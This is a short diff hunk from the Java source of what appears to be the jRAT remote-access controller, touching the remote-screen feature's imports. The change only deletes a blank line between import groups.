@@ -4,7 +4,6 @@ import io.jrat.controller.Slave;
 import io.jrat.controller.packets.outgoing.Packet12RemoteScreen;
 import io.jrat.controller.ui.frames.FrameRemoteScreen;
 import io.jrat.controller.utils.CursorUtils;
-
 import java.awt.Color;
 import java.awt.Graphics2D;
 import java.awt.image.BufferedImage;
